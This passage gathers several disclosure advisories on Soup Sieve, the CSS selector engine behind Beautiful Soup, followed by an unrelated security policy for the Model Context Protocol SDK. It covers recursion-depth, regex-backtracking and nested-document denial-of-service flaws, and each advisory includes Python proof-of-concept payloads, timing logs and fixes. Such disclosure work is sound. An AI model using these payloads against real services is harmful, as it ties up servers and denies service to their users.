The parser dispatches each opening pseudo-class token to `parse_pseudo_open`, which calls back into `parse_selectors` to parse the pseudo-class body. Every nesting level therefore adds Python stack frames, and no counter, depth guard, or `RecursionError` handler bounds this descent. The token-count guard `SELECTOR_LIMIT = 8192` (added for the earlier comma-separated-list memory issue) counts parsed tokens, not recursion depth; at the failing nesting depth the token count is only about 330, roughly four percent of that limit, so the guard never fires. The security invariant that untrusted selector input must not be able to exhaust interpreter resources is not enforced for nesting depth.

```text
soupsieve/css_parser.py
  CSSParser.parse_pseudo_open (line 985): sel.selectors.append(self.parse_selectors(iselector, index, flags))
  CSSParser.parse_selectors  (line 1137): recursive target; dispatches pseudo-class tokens back into parse_pseudo_class -> parse_pseudo_open
  CSSParser.increment_count  (lines 707-712): SELECTOR_LIMIT token guard; increments once per nesting level, cannot bound depth
```

## Impact

Any application that compiles or evaluates untrusted CSS selectors through Soup Sieve (directly or via Beautiful Soup) is affected. No authentication, privilege, or user interaction is required; the failure occurs during selector parsing, before any document is matched. A single crafted selector of about 1.6 KB reliably raises `RecursionError`. The demonstrated capability is a transient denial of the individual request, task, or invocation that parsed the malicious selector: the exception propagates uncaught unless the caller handles `RecursionError` (or a broad `except Exception`). The `RecursionError` in CPython 3.x is a recoverable stack unwind, not an interpreter crash or persistent resource exhaustion, and it carries no confidentiality or integrity impact. Applications following the parser's documented error pattern (catching `ValueError` / `SelectorSyntaxError`) will not catch it, so a repeated stream of such selectors can plausibly cause repeated per-request failures; this per-request availability effect is the demonstrated consequence, not a service-wide or amplified outage.

## Proof of Concept

Requires only an installed Soup Sieve (any release from 0.4 through 2.10) and a default CPython recursion limit of 1000. No Beautiful Soup document or network setup is needed.

```python
import soupsieve as sv

# ~330 levels of nested :is() around a single tag: about 1.6 KB of input.
depth = 330
selector = ":is(" * depth + "a" + ")" * depth
print("selector length:", len(selector))
sv.compile(selector)
```

```text
selector length: 1651
Traceback (most recent call last):
  ...
  File ".../soupsieve/css_parser.py", line 985, in parse_pseudo_open
    sel.selectors.append(self.parse_selectors(iselector, index, flags))
RecursionError: maximum recursion depth exceeded
```

The same failure was reproduced with `:not()`, `:where()`, and `:has()`, and through `BeautifulSoup(...).select(selector)`. A negative control at depth 100 compiles successfully with a token count of 101, confirming the token guard is far from firing.

## Attack Chain

1. **Exposure:** The application exposes `soupsieve.compile()` / `select()` or Beautiful Soup's `.select()` / `.select_one()` to attacker-influenced CSS selector input. These are the library's primary public API and ship enabled by default; Soup Sieve is an automatic dependency of Beautiful Soup 4.
2. **Control:** The attacker fully controls the selector string. The nested pseudo-class pattern (`:is(:is(...a...))`) survives tokenization and normalization unchanged.
3. **Path:** `compile()` reaches `CSSParser.process_selectors()` and then `parse_selectors()`, which dispatches each pseudo-class token through `parse_pseudo_class()` into `parse_pseudo_open()`, which calls `parse_selectors()` again, once per nesting level.
4. **Guard:** The only resource guard is the `SELECTOR_LIMIT` token counter, which reaches about 330 at the failing depth versus its limit of 8192, so it never fires. No recursion-depth counter and no `RecursionError` handler exist anywhere in the package.
5. **Primitive:** Python's recursion limit is exceeded during parsing, raising an uncontrolled `RecursionError`.
6. **Result:** The unhandled `RecursionError` propagates to the caller, failing the request, task, or process invocation that parsed the selector, outside the parser's documented `ValueError` / `SelectorSyntaxError` error contract.

## Bypass Evidence

The relevant existing guard is the `SELECTOR_LIMIT = 8192` token counter in `increment_count()`. It does not block this path: it increments once per nesting level, so at the failing depth of about 330 the count is roughly 330 (about four percent of 8192), verified by instrumenting `increment_count` and observing a maximum count of 329 at the point `RecursionError` was raised. A search of the package for `RecursionError` and `RuntimeError` handlers returns no matches, so nothing catches the error internally, and `functools.lru_cache` on the compile path does not cache exceptions. Attempts to invalidate the finding were made and failed: raising the interpreter recursion limit only shifts the required nesting depth (a proportionally larger but still small selector), and a broad `except Exception` in the caller does catch the error but the parser's documented contract raises only `ValueError` / `SelectorSyntaxError`, so callers coded to that contract remain exposed. This is a distinct weakness from the prior comma-separated-list memory-exhaustion advisory: that issue exhausts heap memory through linear object expansion and was addressed by the token count limit, whereas this issue exhausts the call stack through unbounded recursion depth and is not addressed by any released version, including 2.8.4 which was independently confirmed to still raise `RecursionError` on this input.

## Affected Versions

- `Ecosystem: pip (PyPI)`
- `Package: soupsieve`
- `Confirmed affected range: >= 0.4, <= 2.10`
- `Latest release checked: soupsieve 2.10 (PyPI, latest published release as of 2026-09-25)`
- `Fix status: not fixed in any released version`

The recursive `parse_pseudo_open` to `parse_selectors` structure is present in the earliest PyPI release (0.4) and in every subsequent release through the current 2.10, verified against the published PyPI source artifacts. Version 2.5, release 2.8.4 (which added that token-count limit), and 2.10 were each executed and confirmed to raise `RecursionError` on the crafted input. No released version adds a recursion-depth limit; the token-count `SELECTOR_LIMIT` introduced in 2.8.4 is architecturally unable to bound nesting depth. There is no registry or tag disagreement and no package or module path change.

## Possible Solution

Python's `RecursionError` is sometimes a contested issue related to security. The Soup Sieve project does not consider it "uncontrolled" and allows it to be raised to indicate Python's maximum recursion depth was reached, and allows it to fail to prevent overflows, a much worse and real security vulnerability. With that said, the algorithm can be reworked to be non-recursive, allowing the selector limit check to now capture and raise an exception. In addition, the limit could be exposed to the user to give them better control.

## Mitigation

For those on older versions where the algorithm is still recursive, a try/except block that captures `RecursionError` can be added around calls if accepting untrusted user input is allowed.

## Note

This issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.

---

Reported by zx (GitHub: @manus-pi).

vulnerabilities.summary: Soup Sieve: Regular Expression Denial of Service (ReDoS) via Selector Parser
vulnerabilities.details:
### Summary

The CSS selector parser in soupsieve (the CSS selector engine for Beautiful Soup 4) contains a regular expression vulnerable to catastrophic backtracking. When processing an attribute selector with an unterminated quoted value, the `VALUE` regex pattern in `css_parser.py` enters exponential backtracking. A payload of only **300 bytes** causes the regex engine to hang for **over 3 seconds**, enabling a trivial Regular Expression Denial of Service (ReDoS) attack.

To be completely transparent, AI tools helped surface this issue. However, this was independently reproduced and carefully validated.

Any application that passes untrusted CSS selector strings to `soupsieve.compile()` or Beautiful Soup's `.select()` / `.select_one()` is affected.

### Details

**Affected code:** `soupsieve/css_parser.py`, line ~121 - `RE_VALUES` / `VALUE` regex pattern

The soupsieve CSS parser uses a compiled regular expression to tokenise attribute selector values. This pattern matches both quoted strings (`"value"` or `'value'`) and unquoted identifiers. The regex contains alternation branches for:

1. Double-quoted strings: `"[^"\\]*(?:\\.[^"\\]*)*"`
2. Single-quoted strings: `'[^'\\]*(?:\\.[^'\\]*)*'`
3. Unquoted identifiers

When an attribute selector contains an **unterminated quoted value** - e.g., `[a="xxxx...` (opening `"` but no closing `"`) -” the regex engine attempts to match the quoted-string branch. After that branch fails (no closing quote), the engine backtracks and attempts to match the remaining input against subsequent alternation branches and parent patterns. The structure of the pattern causes **catastrophic backtracking** where the number of backtracking steps grows exponentially with the length of the content between the opening quote and the end of the string.

**Root cause:** The regex pattern does not anchor or guard against the case where a quoted string is never terminated. The overlapping character classes across alternation branches create exponential backtracking when the quoted-string branch fails on long input.

**Key characteristics:**
- **Input size:** Only 300 bytes are needed to trigger a >3 second hang
- **Amplification:** Each additional character approximately doubles the backtracking time
- **No memory impact:** The attack consumes CPU only (regex backtracking is compute-bound)

### Proof of Concept

```python
import time
import soupsieve as sv

PAYLOAD_LEN = 300

# Control: well-formed selector with terminated quote (completes instantly)
well_formed = '[a="' + ('x' * PAYLOAD_LEN) + '"]'
start = time.perf_counter()
try:
    sv.compile(well_formed)
except Exception:
    pass
control_time = time.perf_counter() - start
print(f"Well-formed selector ({len(well_formed)} bytes): {control_time:.4f}s")

# Exploit: unterminated quote triggers catastrophic regex backtracking
malformed = '[a="' + ('x' * PAYLOAD_LEN)
start = time.perf_counter()
try:
    sv.compile(malformed)  # WARNING: This will hang for >3 seconds
except Exception:
    pass
exploit_time = time.perf_counter() - start
print(f"Malformed selector ({len(malformed)} bytes): {exploit_time:.4f}s")

slowdown = exploit_time / max(control_time, 1e-9)
print(f"Slowdown: {slowdown:.0f}x")

# Expected output:
# Well-formed selector (306 bytes): ~0.001s
# Malformed selector (304 bytes): >3.0s (may need to be killed)
# Slowdown: >3000x
#
# NOTE: On some systems the malformed selector may hang indefinitely.
# Use a timeout mechanism (signal.alarm, threading.Timer) when testing.
```

**Safe testing variant with timeout:**

```python
import signal
import soupsieve as sv

def timeout_handler(signum, frame):
    raise TimeoutError("ReDoS confirmed: regex backtracking exceeded timeout")

PAYLOAD_LEN = 300
malformed = '[a="' + ('x' * PAYLOAD_LEN)

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(3)  # 3-second timeout

try:
    sv.compile(malformed)
    print("Selector compiled (not vulnerable)")
except TimeoutError as e:
    print(f"VULNERABLE: {e}")
except Exception as e:
    print(f"Other error: {e}")
finally:
    signal.alarm(0)  # Cancel the alarm
```

### Impact

**Severity: High**

An attacker can cause CPU exhaustion on any server-side Python application that compiles user-supplied CSS selectors via soupsieve. The attack is particularly dangerous because:

1. **Tiny payload:** Only 300 bytes are needed - well within typical URL parameter, form field, or API request limits
2. **No special characters:** The payload consists entirely of printable ASCII characters (`[a="xxx...`)
3. **Exponential scaling:** Each additional byte approximately doubles the backtracking time, making the attack easily tuneable
4. **Thread blocking:** The regex engine blocks the calling thread with no opportunity for interruption (except via OS signals)

| Parameter | Value |
|---|---|
| Input size | 300 bytes |
| CPU time consumed | >3 seconds (exponential with payload length) |
| Memory consumed | Negligible (CPU-only attack) |
| Authentication required | None |
| User interaction required | None |

**Deployment impact:** In threaded or async web applications, a single malicious request blocks a worker thread for the duration of the backtracking. An attacker can submit multiple concurrent requests to exhaust all available workers, causing complete service denial. The small payload size makes the attack easy to deliver and difficult to detect via request size limits.

**Downstream exposure:** soupsieve is an automatic dependency of `beautifulsoup4`, one of the most widely installed Python packages. Any web application, API, or service that accepts CSS selectors from users is potentially affected.

---

### Credit

The vulnerability was discovered by a security research team from the University of Sydney, whose focus is detecting open source software vulnerabilities.
Liyi Zhou: https://lzhou1110.github.io/
Ziyue Wang: https://zyy0530.github.io/
Strick: https://str1ckl4nd.github.io/
Maurice: https://maurice.busystar.org/
Chenchen Yu: https://7thparkk.github.io/

vulnerabilities.summary: Soup Sieve: Polynomial-time ReDoS (O(n²)) in the `IDENTIFIER` / `VALUE` selector sub-patterns
vulnerabilities.details:
## Summary

soupsieve compiles CSS selector strings with a set of hand-written regular expressions. The shared `IDENTIFIER` sub-pattern (also embedded in `VALUE`, and therefore in attribute selectors) places two adjacent quantified groups over overlapping character classes: `(?:[classA]|ESC)+(?:[classB]|ESC)*`, where both classes match ordinary identifier characters such as `a`. When a selector contains a long identifier/value run that must ultimately fail to match (e.g. an attribute value with no closing `]`, or an identifier followed by an invalid character), the regex engine backtracks across all O(n) ways to split the run between the `+` group and the `*` group, giving O(n²) parse time. A single attacker-controlled selector of a few kilobytes stalls the interpreter for many seconds of CPU; tens of kilobytes reach minutes.

## Trust model (Q0)

The selector string is the input. It reaches this code via `soupsieve.compile()`, `soupsieve.select/iselect/match/filter`, and — most commonly — BeautifulSoup's `soup.select(selector)` / `soup.select_one(selector)`, which delegate to soupsieve. This is exploitable in any application that passes a user-controlled CSS selector to BeautifulSoup/soupsieve (scrapers that accept selectors, no-code extraction tools, admin/query UIs). Applications that only use hard-coded selectors are not affected.

## Root cause (exact anchors) — `src/soupsieve/css_parser.py`

```python
# lines 122-126
IDENTIFIER = fr'''
(?:(?:-?(?:[^\x00-\x2f\x30-\x40\x5B-\x5E\x60\x7B-\x9f]|{CSS_ESCAPES})+|--)
(?:[^\x00-\x2c\x2e\x2f\x3A-\x40\x5B-\x5E\x60\x7B-\x9f]|{CSS_ESCAPES})*)
'''
# line 129 — VALUE embeds IDENTIFIER (so attribute values inherit the pattern)
VALUE = fr'''(?:"(?:\\(?:.|{NEWLINE})|[^\\"\r\n\f])*?"|'...'|{IDENTIFIER})'''
```

- classA `[^\x00-\x2f\x30-\x40\x5B-\x5E\x60\x7B-\x9f]` excludes digits (0x30-0x39); classB `[^\x00-\x2c\x2e\x2f\x3A-\x40\x5B-\x5E\x60\x7B-\x9f]` allows digits. The intent is "first char not a digit, remaining chars may be digits."
- Both classes match ordinary letters (e.g. `a` = 0x61). The construct is therefore effectively `(?:C)+(?:C)*` over an overlapping class C — the canonical adjacent-quantifier shape that backtracks quadratically on a failing match.

The quadratic only manifests when the overall match must fail. `IDENTIFIER` matched greedily on `"a"*n` succeeds in linear time (~1 ms at n=32000). Anchoring it so a following element is mandatory and fails (`IDENTIFIER + "$"` against `"a"*n + "!"`) reproduces the O(n²) directly: n=2000 → 44 ms, 4000 → 257 ms, 8000 → 743 ms, 16000 → 2944 ms (~×4 per ×2). Profiling `compile("[a=" + "a"*4000)` shows only 12 `re.match` calls consuming 2.685 s — i.e. the cost is inside a single regex match, confirming regex backtracking (not loop overhead).

## Reproduction environment (discipline #12 — published artifact)

- git HEAD `751c57b` (2.9, `PYTHONPATH=src`): `cd src && python3 ../poc/poc_redos_compile.py`.
- Published PyPI `soupsieve 2.8.4` (fresh `uv pip install soupsieve beautifulsoup4`): `cd poc && ../.venv-published/bin/python poc_redos_compile.py` → same O(n²) (evidence: `poc/evidence_redos_compile_PUBLISHED_2.8.4.log`).
- Python 3.11.15 and 3.14.6 both reproduce.

## PoC (`poc/poc_redos_compile.py`)

```python
import sys, time
sys.path.insert(0, ".")
import soupsieve as sv

def compile_time(sel):
    t0 = time.perf_counter()
    try:
        sv.compile(sel)
        status = "ok"
    except Exception as e:
        status = type(e).__name__
    return (time.perf_counter() - t0), status

print(f"soupsieve {sv.__version__}\n")

print("Payload A: '[a=' + 'a'*n   (unterminated attribute value)")
for n in (1000, 2000, 4000, 8000):
    dt, st = compile_time("[a=" + "a" * n)
    print(f"  n={n:<6} len={3+n:<7} {dt*1000:9.1f} ms  [{st}]")

print("\nPayload B: 'a'*n + '!'   (identifier run + invalid trailing char)")
for n in (2000, 4000, 8000, 16000):
    dt, st = compile_time("a" * n + "!")
    print(f"  n={n:<6} len={n+1:<7} {dt*1000:9.1f} ms  [{st}]")

payload = "[a=" + "a" * 12000
dt, st = compile_time(payload)
print(f"\n[+] Single call: compile('[a=' + 'a'*12000)  (len={len(payload)})")
print(f"[+] wall time = {dt:.2f} s   [{st}]")
```

End-to-end note: `bs4.BeautifulSoup(html).select(payload)` reaches the same `compile()` path, so the stall is triggerable directly through BeautifulSoup with a user-supplied selector. Verified on bs4 4.15.0 + soupsieve 2.8.4: `soup.select("[a=" + "a"*6000)` took ~5.0 s for one call (evidence: `poc/evidence_bs4_select_PUBLISHED_2.8.4.log`).

## Evidence — HEAD 2.9 (verbatim `poc/evidence_redos_compile.log`)

```
soupsieve 2.9

Payload A: '[a=' + 'a'*n   (unterminated attribute value)
  n=1000   len=1003        214.8 ms  [SelectorSyntaxError]
  n=2000   len=2003        504.7 ms  [SelectorSyntaxError]
  n=4000   len=4003       2031.9 ms  [SelectorSyntaxError]
  n=8000   len=8003       8091.3 ms  [SelectorSyntaxError]

Payload B: 'a'*n + '!'   (identifier run + invalid trailing char)
  n=2000   len=2001         79.7 ms  [SelectorSyntaxError]
  n=4000   len=4001        322.9 ms  [SelectorSyntaxError]
  n=8000   len=8001       1328.9 ms  [SelectorSyntaxError]
  n=16000  len=16001      5379.4 ms  [SelectorSyntaxError]

[+] Single call: compile('[a=' + 'a'*12000)  (len=12003)
[+] wall time = 18.28 s   [SelectorSyntaxError]
```

## Evidence — published 2.8.4 (verbatim `poc/evidence_redos_compile_PUBLISHED_2.8.4.log`)

```
soupsieve 2.8.4
Payload A: '[a=' + 'a'*n
  n=1000   len=1003        113.9 ms  [SelectorSyntaxError]
  n=2000   len=2003        457.2 ms  [SelectorSyntaxError]
  n=4000   len=4003       1816.8 ms  [SelectorSyntaxError]
  n=8000   len=8003       7299.0 ms  [SelectorSyntaxError]
[+] Single call: compile('[a=' + 'a'*12000)  wall time = 16.57 s   [SelectorSyntaxError]
```

## Impact — calibrated

- Confirmed: quadratic CPU consumption per `compile()`/`select()` call on an attacker-controlled selector. ~8 KB → ~8 s; ~12 KB → ~17 s; scaling ~×4 per input doubling. A handful of such requests exhausts a worker/thread and degrades or stalls the service (single-threaded regex holds the GIL).
- Realistic exposure: services that accept user-supplied CSS selectors and feed them to BeautifulSoup/soupsieve.
- NOT claimed: exponential blowup, memory corruption, or code execution. This is strictly an availability (DoS) issue, and only where selectors are attacker-influenced. Applications using only fixed selectors are unaffected — stated to avoid inflation.

## Remediation

- Remove the adjacent-quantifier ambiguity in `IDENTIFIER`: match a single leading non-digit character then the remaining class once, e.g. `(?:-?(?:[classA]|ESC)(?:[classB]|ESC)*|--(?:[classB]|ESC)*)`, so no `+`/`*` pair spans the same characters.
- Alternatively use atomic grouping / possessive quantifiers where supported (`(?>...)`, `*+`) to forbid backtracking into the identifier run.
- Defense-in-depth: cap selector length before compiling (reject selectors beyond a sane bound), since CSS selectors are realistically short.

vulnerabilities.summary: Soup Sieve: Polynomial-time ReDoS (O(n²)) in the whitespace/comment trimming regex `RE_WS_END` (triggers on VALID selectors)
vulnerabilities.details:
## Summary

Before tokenizing, `selector_iter` trims leading/trailing whitespace and comments by running two regexes over the whole raw selector with `.search()`. The trailing one, `RE_WS_END = re.compile(r'{WSC}*$')`, is anchored only at the end (`$`), not the start. Because `.search()` retries the pattern at every offset, a long run of whitespace or CSS comments that is not sitting exactly at the end of the string makes each retry greedily consume the run and then fail `$`, producing O(n²) time. This triggers on perfectly valid selectors — e.g. a descendant combinator with a long whitespace gap, `a` + `" "*n` + `b` — so no malformed input is required. A single valid ~20 KB selector stalls the interpreter for ~10 s of CPU.

## Trust model (Q0)

The selector string is the input, reaching this code via `soupsieve.compile()`, the `soupsieve.select/iselect/match/filter` helpers, and BeautifulSoup's `soup.select(selector)` / `soup.select_one(selector)`. Exploitable wherever an application passes a user-controlled CSS selector to BeautifulSoup/soupsieve. Applications using only hard-coded selectors are unaffected.

## Root cause (exact anchors) — `src/soupsieve/css_parser.py`

```python
# line 185-186
RE_WS_BEGIN = re.compile(fr'^{WSC}*')   # anchored at start -> .search() only tries pos 0 -> linear (safe)
RE_WS_END   = re.compile(fr'{WSC}*$')   # NOT anchored at start -> .search() tries every offset

# selector_iter, lines ~1322-1326
m = RE_WS_BEGIN.search(pattern)
index = m.end(0) if m else 0
m = RE_WS_END.search(pattern)                     # <-- O(n^2) here
end = (m.start(0) - 1) if m else (len(pattern) - 1)
```

`WSC = (?:{WS}|{COMMENTS})`. For `RE_WS_END = (?:WS|COMMENTS)*$`, `.search()` walks start offsets 0..n. Whenever the offset lands inside a long whitespace/comment run, `(?:WS|COMMENTS)*` greedily consumes to the run's end, then `$` fails (a non-whitespace char follows), the engine backtracks the whole run, the offset advances by one, and the work repeats — O(n) offsets × O(n) per attempt = O(n²). `RE_WS_BEGIN` avoids this because `^` pins it to a single start offset.

The intent (trim trailing whitespace/comments) can be met with an anchored/loopless approach; the current unanchored `.search()` of a `*$` pattern is the defect.

## Reproduction environment (discipline #12 — published artifact)

- git HEAD `751c57b` (2.9, `PYTHONPATH=src`): `cd src && python3 ../poc/poc_redos_ws_trim.py`.
- Published PyPI `soupsieve 2.8.4` (fresh `uv pip install soupsieve beautifulsoup4`): `cd poc && ../.venv-published/bin/python poc_redos_ws_trim.py` → same O(n²) (evidence: `poc/evidence_redos_ws_trim_PUBLISHED_2.8.4.log`).
- Python 3.11.15 and 3.14.6 both reproduce.

## PoC (`poc/poc_redos_ws_trim.py`)

```python
import sys, time
sys.path.insert(0, ".")
import soupsieve as sv

def ct(sel):
    t0 = time.perf_counter()
    try:
        sv.compile(sel); st = "ok"
    except Exception as e:
        st = type(e).__name__
    return time.perf_counter() - t0, st

print(f"soupsieve {sv.__version__}\n")

print("VALID selector 'a' + ' '*n + 'b'  (descendant combinator, lots of whitespace):")
for n in (2000, 4000, 8000, 16000):
    dt, st = ct("a" + " " * n + "b")
    print(f"  n={n:<6} len={n+2:<7} {dt*1000:9.1f} ms  [{st}]")

payload = "a" + " " * 20000 + "b"
dt, st = ct(payload)
print(f"\n[+] Single call: compile('a' + ' '*20000 + 'b')  (len={len(payload)})")
print(f"[+] wall time = {dt:.2f} s   [{st}]")
```

Isolated confirmation that the cost is in `RE_WS_END.search` specifically (`poc/isolate_ws_trim.py`): `RE_WS_END` on `"div"+" "*n+">"` is O(n²) (2000→100 ms, 4000→448 ms, 8000→1622 ms, 16000→6719 ms), while the start-anchored `RE_WS_BEGIN` on `" "*n+"x"` stays linear (32000→1.5 ms). Profiling `compile` shows the entire wall time in 2 `re.Pattern.search` calls, not `.match`.

## Evidence — HEAD 2.9 (verbatim `poc/evidence_redos_ws_trim.log`)

```
soupsieve 2.9

VALID selector 'a' + ' '*n + 'b'  (descendant combinator, lots of whitespace):
  n=2000   len=2002        112.3 ms  [ok]
  n=4000   len=4002        411.5 ms  [ok]
  n=8000   len=8002       1602.9 ms  [ok]
  n=16000  len=16002      6464.1 ms  [ok]

VALID-looking 'a' + '/*x*/'*n + 'b'  (CSS comment run):
  n=1000   len=5002         48.9 ms  [SelectorSyntaxError]
  n=2000   len=10002       194.8 ms  [SelectorSyntaxError]
  n=4000   len=20002       780.2 ms  [SelectorSyntaxError]
  n=8000   len=40002      3145.3 ms  [SelectorSyntaxError]

[+] Single call: compile('a' + ' '*20000 + 'b')  (len=20002)
[+] wall time = 10.23 s   [ok]
```

## Evidence — published 2.8.4 (verbatim `poc/evidence_redos_ws_trim_PUBLISHED_2.8.4.log`)

```
soupsieve 2.8.4

VALID selector 'a' + ' '*n + 'b':
  n=2000   len=2002        102.7 ms  [ok]
  n=4000   len=4002        404.3 ms  [ok]
  n=8000   len=8002       1618.2 ms  [ok]
  n=16000  len=16002      6457.9 ms  [ok]
[+] Single call: compile('a' + ' '*20000 + 'b')  wall time = 10.11 s   [ok]
```

## Impact — calibrated

- Confirmed: quadratic CPU per `compile()`/`select()` call on an attacker-controlled selector, triggered by a long internal whitespace or CSS-comment run. ~8 KB → ~1.6 s; ~20 KB → ~10 s; scaling ~×4 per input doubling. Notably fires on WELL-FORMED selectors, so it does not depend on a parser error path.
- Realistic exposure: services that accept user-supplied CSS selectors and feed them to BeautifulSoup/soupsieve.
- NOT claimed: exponential blowup, memory corruption, or code execution. Availability (DoS) only, and only where selectors are attacker-influenced.

## Distinction from the IDENTIFIER/VALUE ReDoS

This is a separate root cause and a separate fix: the cost here is entirely in the `RE_WS_END = {WSC}*$` trim step run with `.search()` before tokenizing (measured in `re.Pattern.search`), whereas the IDENTIFIER/VALUE issue is adjacent-quantifier backtracking during token `.match()`. They can be fixed independently.

## Remediation

- Anchor or de-loop the trailing-trim step: instead of `.search()` of `{WSC}*$`, scan trailing whitespace/comments from the end directly (e.g. reverse scan, or `re.compile(r'^{WSC}*').match` on a reversed-equivalent), so no per-offset retry occurs.
- Alternatively strip whitespace/comments in a single forward tokenizing pass rather than with a pre-pass `*$` search.
- Defense-in-depth: cap selector length before compiling.

vulnerabilities.summary: Soup Sieve: Polynomial-time denial of service in the descendant combinator
vulnerabilities.details:
## Summary

Matching a selector that uses the descendant combinator (`a b`) takes time that grows polynomially with how deeply the document is nested, and each extra descendant combinator in the selector raises the degree by one. A selector with `k` descendant combinators takes `O(n^(k+1))` time on a chain of `n` nested elements.

An attacker who controls the HTML or XML that an application passes to Soup Sieve (directly, or through Beautiful Soup's `select()`, `select_one()`, `css.select()`, etc.) can send a very small, deeply nested document that keeps a CPU busy for seconds to minutes against an ordinary selector such as `section div div`.

## Details

To match `a b`, Soup Sieve checks each element against `b` and then walks up through its ancestors looking for one that matches `a`. When the selector has more descendant combinators, the rest of the selector is tried again from each ancestor on that walk, and so on for every combinator. Nothing was reused between walks, so the same ancestors were matched against the same part of the selector over and over.

The worst case is when the leftmost part of the selector never matches, as in `section div div` against a document of nested `<div>` with no `<section>`: every walk goes all the way to the root and no search can stop early.

### Timings

Example timings with `html.parser` on Soup Sieve 3.0.4 and 4.0, using a document of nested `<div>` (5 bytes each) and no matches:

| Nesting depth | Input size | Selector | 3.0.4 | 4.0 |
| --- | --- | --- | --- | --- |
| 2,000 | 10 KB | `section div` | 1.6 s | 0.05 s |
| 4,000 | 20 KB | `section div` | 5.1 s | 0.01 s |
| 400 | 2 KB | `section div div` | 6.7 s | < 0.01 s |
| 800 | 4 KB | `section div div` | 53.0 s | < 0.01 s |
| 100 | 0.5 KB | `section div div div` | 2.5 s | < 0.01 s |
| 200 | 1 KB | `section div div div` | 40.9 s | < 0.01 s |

None of these selectors use unusual syntax.

## Proof of concept

```py
import time
import bs4
import soupsieve as sv

soup = bs4.BeautifulSoup('<div>' * 200, 'html.parser')
t = time.process_time()
sv.select('section div div div', soup)
print(time.process_time() - t)
```

On affected versions, doubling the nesting depth multiplies the time by about 2^(k+1), where `k` is the number of descendant combinators: about 4x for `section div`, 8x for `section div div`, and 16x for `section div div div`.

## Impact

Applications are affected if they run selectors with descendant combinators against documents that untrusted users can influence, such as scrapers, HTML sanitizers or filters, and services that process uploaded or fetched markup. Descendant combinators are among the most common parts of CSS selectors, and a document of about 1 KB is enough to tie up a worker for close to a minute. Applications that only run selectors against trusted documents are not affected.

## Patches

Fixed in 4.0 by [facelessuser/soupsieve#351](https://github.com/facelessuser/soupsieve/pull/351). Whether an element is, or has an ancestor that is, a match for part of a selector depends only on its parent, so Soup Sieve now caches that result per element and relation for every element visited on the walk. Each descendant combinator is then linear in the size of the document. Results are unchanged, and ordinary documents are no slower.

Caching is enabled by default, so no changes are needed beyond upgrading. The `NOCACHE` flag is a temporary fallback for users who run into problems with caching, and it is planned for removal. It uses the old uncached matching, so selectors compiled with `NOCACHE` are still subject to polynomial time and shouldn't be used with descendant combinators on untrusted input.

## Workarounds

If users can't upgrade:

- Use as few descendant combinators as they can in selectors that run on untrusted documents. Where the structure of the
  document is known, the child combinator (`a > b`) only looks at the parent and is not affected.
- Limit the size and nesting depth of untrusted documents before selecting on them.
- Run selection on untrusted input with a time limit, for example in a worker process that can be stopped.

policy_text:
# Security Policy

Thank you for helping keep the Model Context Protocol and its ecosystem secure.

## Supported Versions

| Version                                  | Line                    | Support                                     |
| ---------------------------------------- | ----------------------- | ------------------------------------------- |
| 2.x (newest release)                     | current stable (`main`) | bug fixes, security fixes, new features     |
| 1.x newest release (`v1.x` branch)       | maintenance             | critical bug fixes and security fixes       |
| older 1.x releases, and all pre-releases | unsupported             | upgrade to the newest 1.x release or to 2.x |

Only the newest release of a supported line receives fixes, so reproduce against
it before reporting. If your project depends on `mcp` and is not yet ready for
2.x, keep a `<2` upper bound on your `mcp` requirement and follow the
[migration guide](https://py.sdk.modelcontextprotocol.io/migration/) when you
migrate.

## Reporting Security Issues

If you discover a security vulnerability in this repository, please report it through
the [GitHub Security Advisory process](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability)
for this repository.

Please **do not** report security vulnerabilities through public GitHub issues, discussions,
or pull requests.

## What to Include

To help us triage and respond quickly, please include:

- A description of the vulnerability
- Steps to reproduce the issue
- The potential impact
- Any suggested fixes (optional)
